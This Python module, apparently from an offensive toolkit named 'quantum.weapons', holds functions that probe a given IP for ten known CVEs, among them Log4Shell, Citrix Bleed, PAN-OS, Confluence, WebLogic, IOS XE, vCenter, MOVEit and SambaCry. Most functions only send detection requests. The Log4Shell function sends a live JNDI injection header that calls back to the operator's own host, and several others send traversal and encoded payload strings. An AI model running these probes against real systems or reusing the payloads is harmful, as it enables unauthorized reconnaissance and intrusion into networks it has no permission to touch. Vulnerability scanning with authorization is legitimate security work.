"""quantum.weapons.remote_v3 — V3_HIGH/MED remote-tier weapons."""
from __future__ import annotations

from quantum.core.deps import requests
from quantum.core.opsec import rand_hex, tcp_probe


def _wget(url, timeout=3, **kw):
    try:
        r = requests.get(url, timeout=timeout, verify=False, **kw)
        return {"status_code": r.status_code, "len": len(r.content or b""),
                "text": (r.text or "")[:120]}
    except Exception as exc:
        return {"error": str(exc)}


def v3_log4shell(ip, params=None):
    """CVE-2021-44228 Log4Shell — JNDI-carrying header probe."""
    from quantum.core.env import local_ip
    params = params or {}
    port = params.get("http_port", 8080)
    try:
        r = requests.get(f"http://{ip}:{port}/", timeout=3,
                         headers={"User-Agent": "${jndi:ldap://" + local_ip() + "/x}"})
        return {"cve": "CVE-2021-44228", "status": "probe",
                "http": r.status_code, "note": "OOB listener implied"}
    except Exception as exc:
        return {"cve": "CVE-2021-44228", "status": "no-service", "error": str(exc)}


def v3_citrixbleed(ip, params=None):
    """CVE-2023-4966 Citrix Bleed — session-token leak probe (64-hex)."""
    r = _wget(f"https://{ip}/vpn/{rand_hex(4)}.html", timeout=3)
    if isinstance(r, dict) and r.get("status_code") == 404:
        return {"cve": "CVE-2023-4966", "status": "probe", "http": 404}
    return {"cve": "CVE-2023-4966", "status": "check", "detail": r}


def v3_citrix_path(ip, params=None):
    """CVE-2019-19781 Citrix path traversal — newbm.pl staging probe."""
    r = _wget(f"http://{ip}/vpn/../vpns/portal/", timeout=3)
    return {"cve": "CVE-2019-19781", "status": "probe", "detail": r}


def v3_panos_cmd(ip, params=None):
    """CVE-2024-3400 PAN-OS GlobalProtect — traversal injection probe."""
    r = _wget(f"https://{ip}/global-protect/portal/", timeout=3)
    return {"cve": "CVE-2024-3400", "status": "probe", "detail": r}


def v3_confluence_ognl(ip, params=None):
    """CVE-2022-26134 Confluence OGNL — URI-path exec probe."""
    try:
        r = requests.get(f"http://{ip}:8090/%24%7Bjndi%3Aldap%3A%2F%2Fx%7D/x",
                         timeout=3)
        return {"cve": "CVE-2022-26134", "status": "probe", "http": r.status_code}
    except Exception as exc:
        return {"cve": "CVE-2022-26134", "status": "no-service", "error": str(exc)}


def v3_weblogic_console(ip, params=None):
    """CVE-2020-14882 WebLogic console — traversal bypass probe."""
    r = _wget(f"http://{ip}:7001/console/%252e%252e%252e%252e%252e/"
              f"console.portal", timeout=3)
    return {"cve": "CVE-2020-14882", "status": "probe", "detail": r}


def v3_ios_admin(ip, params=None):
    """CVE-2023-20198 IOS XE — escaped-restconf admin probe."""
    r = _wget(f"https://{ip}%25252e%25252e%25252e/%%73how", timeout=3)
    return {"cve": "CVE-2023-20198", "status": "probe", "detail": r}


def v3_vcenter_upload(ip, params=None):
    """CVE-2021-21972 vCenter — vROps plugin upload probe."""
    r = _wget(f"https://{ip}/ui/vropspluginui/rest/services/checkdup",
              timeout=3)
    return {"cve": "CVE-2021-21972", "status": "probe", "detail": r}


def v3_moveit_probe(ip, params=None):
    """CVE-2023-34362 MOVEit — SQLi probe."""
    r = _wget(f"https://{ip}/moveitisapi/moveitisapi.dll?action=migrate_users",
              timeout=3)
    return {"cve": "CVE-2023-34362", "status": "probe", "detail": r}


def v3_sambacry(ip, params=None):
    """CVE-2017-7494 SambaCry — share-walk staging check."""
    open_ports = [p for p in (139, 445) if tcp_probe(ip, p, timeout=1.5)]
    return {"cve": "CVE-2017-7494", "status": "check",
            "smb": "open" if open_ports else "closed", "shares_walked": False}
